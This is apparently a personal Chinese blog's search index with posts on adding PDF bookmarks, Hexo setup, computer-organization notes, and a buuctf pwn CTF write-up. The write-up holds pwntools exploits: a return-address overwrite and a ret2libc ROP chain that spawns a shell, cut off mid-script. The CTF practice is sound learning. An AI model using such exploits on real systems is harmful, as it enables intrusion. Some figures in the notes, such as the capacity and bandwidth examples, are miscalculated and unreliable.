<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PDF如何添加目录</title>
    <url>/2020/01/31/PDF%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<p>不知道大伙有没有遇到这样的问题：在网上找的很多PDF都没有目录，尤其是一些扫描版pdf，或者是有目录但是页码错误等等。这样非常不方便我们查阅和学习，为了解决这些问题，我们可以自己手动给PDF添加目录，添加的过程很简单，下面就教大家如何添加目录。</p>
<p>修改目录我们需要FreePic2Pdf（下载链接在后文）和一个文本编辑器（这里我使用的是sublime
text）</p>
<h1 id="查找目录">查找目录</h1>
<p>以《Orange's
一个操作系统的实现》为例。这本书是扫描版的没有目录，如图：</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131142740876.png"  alt="image-20200131142740876" style="zoom:40%;" /></p>
<p>那么我们开始制作书签。首先我们要获得书签的文本。由于是扫描版，目录文本无法选中，因此我们在百度上搜索这本书的目录，一般这本书的百度百科都有目录。</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131143106649.png"  alt="image-20200131143106649" style="zoom:50%;" /></p>
<p>但是这个目录没有页码，所以我们再找其他的（当然你也可以手动输入目录）</p>
<p>找到一个合适的：</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131143421497.png"  alt="image-20200131143421497" style="zoom: 60%;" /></p>
<p>将目录复制粘贴到文本编辑器中（这里我用的是sublime），我们需要修改文本的格式，PDF书签需要特定格式才能正确添加到PDF中。</p>
<h1 id="修改目录">修改目录</h1>
<h2 id="修改页码">修改页码</h2>
<p>首先需要注意的一点是页码。这本书的页码是从正文开始算的，也就是说前面序言目录等等都不算在页码的范围内，但是添加的目录中的页码需要算上序言，也就是说在这本书中第一章不是从第2页开始的，而是从22页开始的，所以页码需要进行修改。</p>
<p>修改页码有两种方式，一种是批量修改每个条目的页码，是比较麻烦的。另一种就需要用到FreePic2Pdf这个软件了。这里先介绍第一种。</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131144118440.png"  alt="image-20200131144118440" style="zoom:67%;" /></p>
<p>批量修改页码，我们使用excel进行修改。直接复制粘贴无法将目录正确的复制进表格中，文本只会出现在第一列，而我们的想法是让页码单独一页，这样我们就能批量修改了，那么我们首先修改目录文本的格式使之适配excel。</p>
<p>首先看我的原本的文本是这样的</p>
<img src="/2020/01/31/PDF%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E7%9B%AE%E5%BD%95/image-20200131144817437.png" class="" title="image-20200131144817437">
<p>可以看到页码和标题间隔着一个空格（sublime中一个空格显示为一个 ·
）那么就可以通过一个<strong>可区分和定位的特征</strong>（数字前有一个空格）对这个位置的空格进行批量操作，将这一个空格替换成英文逗号。</p>
<p>ctrl+h进行替换。这里为了准确定位需要使用正则表达式进行替换（只要掌握基础的正则表达式语法即可，可以看看<a
href="https://deerchao.cn/tutorials/regex/regex.htm">这篇教程</a>)。<code>\d</code>代表一个数字，<code>+</code>表示匹配前面的字表达是一次或多次（也就是说）。我们要修改的是数字前面的一个空格，而数字要保留，所以我们输入<code>空格</code>+<code>(\d+)</code>，<code>()</code>中括到的是我们要保存的，如图:</p>
<img src="/2020/01/31/PDF%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E7%9B%AE%E5%BD%95/image-20200131152054846.png" class="" title="image-20200131152054846">
<p>可以看到sublime自动识别出了定位的范围，最好这时候再检查一下，看看有没有不是页码的地方也符合定位条件（数字前面一个空格），有时候标题也会出现匹配到的情况，这里检查之后都正常，只有页码匹配到了，非常好，接下来就将空格修改成逗号即可。<img
src="PDF如何添加目录/f9daacce504be4ee47fe852fe4d94d1f.png" />表示取出第一个括号匹配的内容（<img
src="PDF如何添加目录/4e862458b5675841ae10a60bdd159759.png" />就是第二个括号，这里就这一个括号）</p>
<p>所以替换的语句的意思就是替换成<code>,</code>+<code>\d+</code></p>
<p>全部替换后如图：</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131152727154.png"  alt="image-20200131152727154" style="zoom:50%;" /></p>
<p>可以看到已经全部替换完成了。</p>
<p>保存成.csv文件，然后新建一个excel的空白文件，打开空白文件，点击数据-&gt;自文本</p>
<img src="/2020/01/31/PDF%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E7%9B%AE%E5%BD%95/image-20200131160138386.png" class="" title="image-20200131160138386">
<p>然后选中csv文件，点击下一步</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131160241926.png"  alt="image-20200131160241926" style="zoom: 67%;" /></p>
<p>分隔符号选逗号然后点下一步-&gt;完成-&gt; 确认。</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131160323494.png"  alt="image-20200131160323494" style="zoom:67%;" /></p>
<p>这样就得到了待修改的目录。</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131160422795.png"  alt="image-20200131160422795" style="zoom:67%;" /></p>
<p>批量修改页码，不会改的看<a
href="https://zhidao.baidu.com/question/942624256796659372.html?qbl=relate_question_2">这里</a>。</p>
<p>然后复制粘贴到sublime。这样我们的页码就修改好了。同时在粘贴到sublime之后我们会发现页码前已经变成了制表符，节省了我们再批量修改成制表符的麻烦（sublime中制表符是以横杠：<img src="/2020/01/31/PDF如何添加目录/image-20200131162804210.png"  alt="image-20200131162804210" style="zoom:67%;" />的形式表示）</p>
<h2 id="修改章节分级">修改章节分级</h2>
<p>页码修改好后，我们还要修改章节的分级，例如1.1在第一章下，1.1.1在1.1下，如果你认为目录不用折叠也无所谓，那你可以不做修改，但是，如果你想要目录可以分级折叠，例如下图，那么我们还需要修改目录的格式。</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131163225180.png"  alt="image-20200131163225180" style="zoom:50%;" /></p>
<p>修改的方式是<strong>添加缩进</strong>，一级标题不添加缩进，二级标题加一个制表符，三级缩进加两个制表符，以此推类。</p>
<p>修改还是通过正则表达式进行修改。当然手改也可以。</p>
<p>本书中，上下篇是一级目录，所以不用修改，第一章第二章是二级标题，所以在开头加一个缩进。<code>\t</code>表示一个制表符。</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131163748622.png"  alt="image-20200131163748622" style="zoom:67%;" /></p>
<p>1.1是三级标题，所以有两个制表符，<code>^</code>表示字符串的开始，也就是说要匹配的是开头一个或多个数字，然后一个点然后接着一个或多个数字然后一个空格，也就是我们要找的三级标题。注意最后有个空格来限定是1.1而不是1.1.1。</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131164158103.png"  alt="image-20200131164158103" style="zoom:67%;" /></p>
<p>2.1.1是四级标题也就是三个制表符，不赘述了，如图：</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131164600065.png"  alt="image-20200131164600065" style="zoom:67%;" /></p>
<p>最终得到的目录如图：</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131164635505.png"  alt="image-20200131164635505" style="zoom: 50%;" /></p>
<p>这样一个符合格式的目录就做好了。接下来就是添加目录了。</p>
<h1 id="添加目录">添加目录</h1>
<p>添加目录需要用到FreePic2Pdf（链接：https://pan.baidu.com/s/1GCMIlwLSL1Z4eI64XrZeTQ
提取码：146l ）</p>
<p>软件界面如图</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131165159064.png"  alt="image-20200131165159064" style="zoom:67%;" /></p>
<p>点击右下角更改PDF，选择从PDF取书签，把pdf拖进去点击开始，然后在你pdf的目录下会生成一个同名的文件夹，打开，有这两个文件。</p>
<img src="/2020/01/31/PDF%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E7%9B%AE%E5%BD%95/image-20200131165420390.png" class="" title="image-20200131165420390">
<p>这个txt就是你的目录了，由于开始时没有目录，所以这是个空文件，将我们刚才修改好的目录复制进去并保存。然后再次使用FreePic2Pdf，选择往PDF挂书签，它默认就是刚才的文件，所以直接点击开始即可</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131165725870.png"  alt="image-20200131165725870" style="zoom: 67%;" /></p>
<p>编辑完成即成功。打开PDF文件看看，成功挂上了书签！</p>
<p><img src="/2020/01/31/PDF如何添加目录/image-20200131165831626.png"  alt="image-20200131165831626" style="zoom:50%;" /></p>
<hr />
<h1
id="使用freepic2pdf解决页码偏移问题">使用FreePic2Pdf解决页码偏移问题</h1>
<p>这个方法在当时我写这篇博客的时候还不知道，现在补上。</p>
<p>FreePic2Pdf生成的文件夹中，除了有txt的目录以外，还有一个itf的配置文件。</p>
<p>使用sublime打开如下：</p>
<img src="/2020/01/31/PDF%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E7%9B%AE%E5%BD%95/e85c86ce08c182983fdf56cf36b12043.png" class="">
<p>basepage表示目录中的第一页代表实际页面的数值，例如这里为4就说明目录的第一页对应pdf的第4页。</p>
<p>通过修改这个basepage就可以很方便的解决页码偏移问题。</p>
]]></content>
      <categories>
        <category>Tinker</category>
      </categories>
      <tags>
        <tag>PDF</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo折腾实录</title>
    <url>/2024/06/11/hexo/</url>
    <content><![CDATA[<p>戳👉<a
href="https://hexo.io/docs/">hexo官方文档</a>阅读官方文档。</p>
<h3 id="使用next模板">使用next模板</h3>
<p><a
href="https://theme-next.js.org/docs/getting-started/">官方教程</a>
为了方便后续配置，可以使用如下命令建立符号连接</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s node_modules/hexo-theme-next/_config.yml _config.next.yml</span><br></pre></td></tr></table></figure>
<h3 id="自定义新建post文章的yaml">自定义新建post文章的yaml</h3>
<p>修改scaffold中的post.md.</p>
<h3
id="设置hexo首页只显示文章部分摘要">设置hexo首页只显示文章部分摘要</h3>
<p>针对next主题，有两种方法。</p>
<ol type="1">
<li><p>添加文章概述</p>
<p>在开头的yaml中加入<code>description: xxx</code>，这样的话就只会显示<code>description</code>了。</p></li>
<li><p>在文章中想截断的部分加入<code>&lt;!--more--&gt;</code></p></li>
</ol>
<h3 id="让hexo支持数学公式">让hexo支持数学公式</h3>
<p>有问题先看<a
href="https://theme-next.js.org/docs/third-party-services/math-equations.html">官方教程</a>！找了很多博客都不行。</p>
]]></content>
      <categories>
        <category>Tinker</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>计组学习笔记</title>
    <url>/2019/10/10/Lecture/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="第一章概论">第一章：概论</h1>
<h2 id="计算机系统组成">计算机系统组成</h2>
<p>软件+硬件=计算机系统</p>
<p>硬件和软件相辅相成，相互依存，缺一不可。</p>
<p>软硬件相互依存，协同发展，在逻辑上等价。</p>
<h2 id="计算机系统的层次结构">计算机系统的层次结构</h2>
<p>不同层次的使用者看到的计算机功能属性也不同。</p>
<h2 id="存储程序计算机">存储程序计算机</h2>
<h3 id="存储程序计算机特点">存储程序计算机特点</h3>
<ul>
<li>由运算器、控制器、存储器、输入设备和输出设备五大部件组成</li>
<li>指令和数据均用二进制数表示</li>
<li>指令和数据以同等地位存放于存储器内，并可按地址访问</li>
<li>指令由操作码和地址码组成</li>
<li>指令在存储器内按顺序存放（下一条指令放在IP中）</li>
</ul>
<h2 id="计算机硬件组成">计算机硬件组成</h2>
<h3 id="总线结构">总线结构</h3>
<p>现代计算机大多采用总线结构，总线将计算机各部件连接在一起，形成为一个完整的计算机硬件系统。总线也成为各部件间传输信息的公共通道。</p>
<h3 id="输入输出">输入输出</h3>
<p>I/O 子系统完成人—机交互功能。包括各种I/O
设备及相应的接口。设备通过接口与主机联系，接收控制器发来的各种控制命令，并完成相应的操作。</p>
<p>输入设备：将人们熟悉的信息形式转换为机器能识别的信息形式</p>
<p>输出设备：将机器运算结果转换为人们熟悉的信息形式</p>
<p>注意显卡也是I/O设备。</p>
<h3 id="主存储器">主存储器</h3>
<p>主存储器（简称主存）是计算机的主要工作存储器，存放正在运行的程序和数据。主存包括存储体、各种逻辑部件及控制电路等。</p>
<h3 id="控制器">控制器</h3>
<p>由程序计数器PC、指令寄存器IR 、时序逻辑以及控制单元CU 组成。</p>
<p>是计算机的指挥中心，由它发出控制命令。</p>
<p><img src="/2019/10/10/Lecture/计组学习笔记/1569485100489.png"  alt="1569485100489" style="zoom:65%;" /></p>
<h3 id="运算器">运算器</h3>
<p>进行数据加工处理。核心是算术逻辑运算单元ALU，还包含一些寄存器，用来暂存参与运算的数据以及运算结果。</p>
<h2 id="计算机程序运行">计算机程序运行</h2>
<h3 id="硬件运行程序的必要条件">硬件运行程序的必要条件</h3>
<p>程序已被转换为机器指令序列，即可执行程序</p>
<p>可执行程序已经加载到主存储器中，并将起始地址置于PC</p>
<h3 id="运行过程">运行过程</h3>
<img src="/2019/10/10/Lecture/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/e9ab9ad3098a7206c675b9040902689a.png" class="">
<h3 id="取指令分析指令">取指令、分析指令</h3>
<p><img src="/2019/10/10/Lecture/计组学习笔记/1569486286259.png"  alt="1569486286259" style="zoom:67%;" /></p>
<h3 id="执行指令">执行指令</h3>
<p><img src="/2019/10/10/Lecture/计组学习笔记/1570161714029.png"  alt="1570161714029" style="zoom:67%;" /></p>
<h2 id="计算机系统性能">计算机系统性能</h2>
<p>性能 = 功能 + 质量</p>
<p>硬件子系统性能和软件子系统性能共同决定一台计算机系统的性能。</p>
<p>计算机系统的性能只能通过各类软件在硬件上运行而体现出来。</p>
<h2 id="运算速度">运算速度</h2>
<p>吉普森法：</p>
<p><span class="math display">\[T_{M} =\displaystyle\sum_{i=1}^{n}
f_it_i\]</span></p>
<p>TM —— 程序综合运行时间</p>
<p>fi ——第 i 种指令占程序全部指令的百分比数</p>
<p>ti —— 第 i 种指令的执行时间</p>
<p>常用单位：</p>
<ul>
<li>MIPS 每秒执行百万条指令数</li>
<li>CPI 执行一条指令所需的时钟周期数</li>
<li>FLOPS 每秒浮点运算次数</li>
</ul>
<h2 id="字字节位的关系与区别">字、字节、位的关系与区别</h2>
<h3 id="位bit">位（bit）</h3>
<p>位又叫比特，是计算机存储的<strong>最小单位</strong>。</p>
<p>1、0表示一位，00、01、10、11表示两位，以此类推。所以n位可以表示2^n种状态。</p>
<h3 id="字节byte">字节（Byte）</h3>
<p>字节是计算机存储中处理数据的<strong>基本单位</strong>。</p>
<p>一个字节一般规定等于8位，因此一个字节的范围就是00000000b~11111111b（b表示二进制），即1B=8b。</p>
<h3 id="字word">字（word）</h3>
<p>字是计算机一次处理数据的<strong>最大单位</strong>。</p>
<p>计算机中大多数寄存器的大小是一个字长。也就是说计算机一次可以处理一个字的数据。</p>
<p>字和字长的关系<strong>不是固定</strong>的，一般等于字节的整数倍。</p>
<p>64位计算机就说明计算机的机器字长为64位，一次可以处理64位的数据，也就是8字节的数据。</p>
<p>需要注意的是，有种说法是一个字规定为两个字节。这是因为早期8086是16位的，那时候一个字就是两个字节。后来8086发展出了32位，这时候一个字到底是32位还是16位就说不清楚了，为了不混淆，就硬性规定了一个字为两个字节，而把32位的叫双字，后来64位的叫四字。<strong>但是在计组这门课中，字还是根据机器字长来决定</strong>。</p>
<h2
id="kbmbgb到底是10次幂还是2次幂">KB、MB、GB……到底是10次幂还是2次幂</h2>
<p>存储器以二进制计算容量，最小单位是Byte，简写为B。实际上，标准二进制乘数词头（也就是2次幂）的缩写为Ki、Mi、Gi……</p>
<ul>
<li>1KiB = 1024B = 2^10B（Byte）</li>
<li>1MiB = 1024KiB = 2^20B</li>
</ul>
<p>而K，M、G等词头则是国际单位制，也就是按10次幂计算</p>
<ul>
<li>1KB = 1000B = 10^3B</li>
<li>1MB = 1000KB = 10^6B</li>
</ul>
<p><strong>但是</strong>，二进制乘数词头没有被广泛采用，标识为4GB的内存实际上已经是4GiB。</p>
<p>因此，在以后遇到计算容量，就按2次幂计算。但是特别注意在计算存储器带宽时还是用10次幂计算。</p>
<h2 id="第一章例题">第一章例题</h2>
<p>Q：你如何理解硬、软件逻辑等价性？</p>
<p>A：</p>
<ul>
<li>计算机系统结构中，除最基本的功能必须由硬件实现外，其余功能既可以由硬件实现，也可以由软件实现。</li>
<li>对某个特定功能来说，由硬件还是软件实现后所能到达的计算机系统的性能是有差异的。</li>
<li>通常，某个特定的功能由硬件实现比用软件实现的执行速度快，但是成本高。软件实现的灵活性好。</li>
</ul>
<p>Q：存储程序计算机中，CPU正在执行的程序所包含的指令和数据均以二进制形式存储于主存储器，CPU需要区分指令和数据吗？为什么？CPU如何区分？</p>
<p>A：</p>
<ul>
<li>需要区分。</li>
<li>因为CPU将指令和数据从存储器中取出后要进行不同的操作。取出指令后放到指令寄存器IR中，然后进行指令译码等操作。而取出数据后放到数据寄存器中，进行算数/逻辑等操作。</li>
<li>CPU通过不同的时间段来区分指令和数据。取指周期取出的即为指令，执行周期取出的即为数据。</li>
</ul>
<p>Q：讨论将程序和数据存放在同一存储器中的优缺点。</p>
<p>A：</p>
<ul>
<li>优点：主存只有一个地址空间，编程简单，管理容易，空间利用率高。</li>
<li>缺点：指令与数据共享存储器访问总线，效率较低。</li>
</ul>
<p>Q：存储程序计算机中，指令在主存中按顺序存放，其优点是什么？</p>
<p>A：</p>
<ul>
<li>可以较为方便地按顺序存放和按顺序读取和执行。</li>
<li>顺序执行时指令寻址可以PC自增完成。</li>
<li>顺序执行时，指令中不需要给出下一条指令的地址，有利于缩短指令字长度。</li>
</ul>
<h1 id="第二章指令系统">第二章：指令系统</h1>
<p>要想学习指令系统，首先要了解指令是如何存放在电脑中的。要想学习指令存储的知识，首先要了解主存储器。</p>
<h2 id="主存编址方式">主存编址方式</h2>
<p>主存单元的地址编排方式。编址方式决定了主存的<strong>能被CPU访问的最小单位</strong>.</p>
<h3 id="按字编址方式">按<strong>字</strong>编址方式</h3>
<ul>
<li>主存的最小编址单位是一个字。</li>
<li>对主存数据的访问只能以字为单位。</li>
</ul>
<h3 id="按字节编址方式">按<strong>字节</strong>编址方式</h3>
<ul>
<li><p>主存的<strong>最小编址单位</strong>是一个字节。</p></li>
<li><p>对主存数据的访问既能以字节为单位、也能以字为单位。</p></li>
<li><p>当CPU按字节访问主存时，用字节地址，当CPU按字访问主存时，用字地址。</p></li>
<li><p>通常存储字长是字节整数倍</p></li>
<li><p>字节地址连续，字地址不连续。</p>
<p>eg：字节地址为0、1、2、3、4、5、6……</p>
<p>字长为32位，也就是一个字等于四个字节</p>
<p>则第一个字地址为0，第二个字地址为4，</p>
<p>往后为8、12、16……</p></li>
</ul>
<h4 id="字节编址编址顺序">字节编址编址顺序</h4>
<ul>
<li><p>大端序 低地址高字节</p></li>
<li><p>小端序 低地址低字节</p>
<p>eg：0x12345678</p>
<p>大端序：<img src="/2019/10/10/Lecture/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1569429593275.png" class="" width="1569429593275"></p>
<p>小端序：<img src="/2019/10/10/Lecture/%E8%AE%A1%E7%BB%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1569429691999.png" class="" width="1569429691999"></p></li>
</ul>
<h4 id="字节编址边界问题">字节编址边界问题</h4>
<ul>
<li><p>边界对齐 空间有浪费</p></li>
<li><p>边界不对齐 2次存储器访问</p>
<p><img src="/2019/10/10/Lecture/计组学习笔记/1569430434590.png"  alt="1569430434590" style="zoom:70%;" /></p></li>
</ul>
<h3 id="字编址和字节编址的优缺点">字编址和字节编址的优缺点</h3>
<p>字编址：</p>
<ul>
<li>优点：机器结构简单、操作简便。主要应用于早期的计算机中。</li>
<li>缺点：数据较短时操作不方便、在非数值应用领域，信息基本寻位是字节，字编址无法支持字节操作。随着机器字长越来越长，字编址的不灵活性越来越突出。</li>
</ul>
<p>字节编址：</p>
<ul>
<li>优点：兼具字节寻址和字寻址的功能，灵活性好，存储器空间利用率高。</li>
<li>缺点：机器结构较为复杂。</li>
</ul>
<h2 id="主存结构">主存结构</h2>
<p><img src="/2019/10/10/Lecture/计组学习笔记/1569466709850.png"  alt="1569466709850" style="zoom:67%;" /></p>
<h3 id="存储体结构">存储体结构</h3>
<p>存储体由许多存储单元组成，每个存储单元又包含若干个存储元（或称存储元、存储元件），每个存储元能寄存一位二进制代码“0”或“1”。</p>
<p><img src="/2019/10/10/Lecture/计组学习笔记/1569466311308.png"  alt="1569466311308" style="zoom:70%;" /></p>
<h3 id="存储单元">存储单元</h3>
<p>CPU访问存储器的最小单位就是存储单元。每个存储单元都有一个地址，通过地址总线寻址。</p>
<h2 id="主存性能指标">主存性能指标</h2>
<h3 id="存储容量">存储容量</h3>
<p>存储容量=存储单元个数*存储字长（按字编址）
（注意不要乘开，乘开没有意义）</p>
<p>存储容量=存储单元个数*存储字长/8=字节数（按字节编址）</p>
<p>某机可达存储容量上限由地址总线位数确定。</p>
<p>eg：一个存储器有20根地址总线，8根数据总线，则</p>
<p>按字编址：2^20×8=2M×8位</p>
<p>按字节编址：2^20×8/8=2MB字节</p>
<h3 id="存取速度">存取速度</h3>
<h4 id="存取时间">存取时间</h4>
<p>启动一次存储器操作到操作完成所需要的时间。</p>
<h4 id="存取周期">存取周期</h4>
<p>存储器连续两次独立操作所需最小时间间隔。</p>
<p>通常，存取周期&gt;存取时间，存取周期=存取时间+恢复时间</p>
<h3 id="存储器带宽">存储器带宽</h3>
<p>单位时间内存储器存取的信息量，单位为字/秒、字节/秒或位/秒。</p>
<p>存储器带宽=存取周期的倒数</p>
<p>eg：存取周期500ns，字长16位，则带宽=1字/500ns=2M字/s=4M字节/s=32位/s</p>
<p>注意：M为10^6，时间单位的转换，同一般公制单位。</p>
<h2
id="机器字长存储字长指令字长数据字长的关系与区别">机器字长、存储字长、指令字长、数据字长的关系与区别</h2>
<h3 id="机器字长">机器字长</h3>
<p>计算机一次处理的数据的大小，一般就是寄存器的大小，例如一个机器字长为32位，就说明这台计算机一次可以处理32位的数据，它的一个字的长度为32位。通常规定机器字长是2^n倍。</p>
<h3 id="存储字长">存储字长</h3>
<p>存储器中一个存储单元中存储的二进制码位数。</p>
<p>存储器按字节编址时，存储字长为一个字节；按字编址时，存储字长等于机器字长</p>
<p>早期计算机的存储字长一般和机器的指令字长与数据字长相等，故访问一次主存便可取一条指令或一个数据。随着计算机的发展，往往要求指令字长是可变的，数据字长也要求可变。为了适应指令和数据字长的可变性，其长度不由存储字长来确定，而由字节的个数来表示。</p>
<h3 id="指令字长">指令字长</h3>
<p>一条指令中包含的二进制码位数。指令字长=操作码长度+地址码长度*地址码个数</p>
<p>通常指令字长是字节的整数倍。</p>
<h3 id="数据字长">数据字长</h3>
<p>数据字长：计算机数据存储所占用的位数。</p>
<h2 id="指令格式">指令格式</h2>
<p>指令 = 操作码 + 地址码</p>
<p>操作码指出指令要干什么，地址码给出操作对象的位置或者下一条指令的位置</p>
<h2 id="指令结构">指令结构</h2>
<p>等长指令字结构：指令字长相等，通常也等于机器字长</p>
<p>变长指令字结构：指令长度不等</p>
<h3 id="cpu结构">CPU结构</h3>
<p><img src="/2019/10/10/Lecture/计组学习笔记/1570187921133.png"  alt="1570187921133" style="zoom:67%;" /></p>
<h3 id="按地址码个数分类">按地址码个数分类</h3>
<ul>
<li><p>三地址指令</p>
<p>操作码 A1 A2 A3</p>
<p>操作：A3 ←（A1）OP（A2）</p></li>
<li><p>二地址指令</p>
<p>操作码 A1 A2</p>
<p>操作：A1 ←（A1）OP（A2）</p></li>
<li><p>一地址指令</p>
<p>操作码 A</p>
<p>操作： AC ←（AC）OP（A）</p></li>
<li><p>零地址指令</p>
<p>操作码</p>
<p>操作数来自（送往）堆栈栈顶</p></li>
</ul>
<h3 id="操作码字段">操作码字段</h3>
<ul>
<li>定长操作码：所有指令的操作码位数相同，并将操作码集中安排在指令字的一个固定的字段中</li>
<li>变长操作码：各种指令的操作码位数不一致，并且操作码可以分散在指令字的不同字段中</li>
</ul>
<h2 id="操作码扩展技术">操作码扩展技术</h2>
<p><strong>前提</strong>：定长指令字、多种地址码混合用</p>
<p>可利用地址码个数较少的指令空出的地址码字段，增加操作码的位数（增加能表示的指令个数）</p>
]]></content>
      <categories>
        <category>Study</category>
        <category>Lecture</category>
      </categories>
      <tags>
        <tag>计组</tag>
      </tags>
  </entry>
  <entry>
    <title>buuctf-pwn刷题之旅</title>
    <url>/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/</url>
    <content><![CDATA[<h1 id="连上就有flag的pwn">连上就有flag的pwn</h1>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568305685314.png" class="" width="1568305685314">
<h1 id="rip覆盖一下">RIP覆盖一下</h1>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307672397.png" class="" width="1568307672397">
<p>IDA看一下：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307909466.png" class="" width="1568307909466">
<p>典型的溢出，函数中有fun函数：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568307994407.png" class="" width="1568307994407">
<p>看一下偏移：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568308011545.png" class="" width="1568308011545">
<p>有一个需要注意的地方就是nc连上发现没有输出input，直接让我输入，所以exp改了一下。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">6001</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;../files/pwn1&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0xf</span> + <span class="number">8</span>) + p64(<span class="number">0x401186</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>得到flag：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568308290836.png" class="" width="1568308290836">
<h1 id="ciscn_2019_c_1">ciscn_2019_c_1</h1>
<p>还是个64位的ELF，IDA分析一下：</p>
<p>main函数里没有啥：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359070246.png" class="" width="1568359070246">
<p>encrypt()函数里存在栈溢出：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359126837.png" class="" width="1568359126837">
<p>由于程序中没有system和sh所以ROP攻击。</p>
<p>思路是通过栈溢出返回程序中的puts函数把gets函数的地址泄露出来，然后找到偏移地址，再调用system和/bin/sh来获得shell。</p>
<p>看一下s：</p>
<img src="/2019/09/15/CTF/buuctf-pwn%E5%88%B7%E9%A2%98%E4%B9%8B%E6%97%85/1568359326141.png" class="" width="1568359326141">
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;../files/ciscn_2019_c_1&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn.buuoj.cn&#x27;</span>, <span class="number">20115</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;../files/ciscn_2019_c_1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x400B28</span></span><br><span class="line">rdi_addr = <span class="number">0x0000000000400c83</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">gets_got = e.got[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;puts_plt =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(puts_plt)))</span><br><span class="line">log.success(<span class="string">&#x27;gets_got =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_got)))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice!\n&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x50</span> + <span class="number">8</span>)</span><br><span class="line">payload1 += p64(rdi_addr) + p64(gets_got) + p64(puts_plt)</span><br><span class="line">payload1 += p64(start)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">gets_leak = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;get_leak_addr =&gt; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(gets_leak)))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;gets&#x27;</span>, gets_leak)</span><br><span class="line">libc_base = gets_leak - libc.dump(<span class="string">&#x27;gets&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + 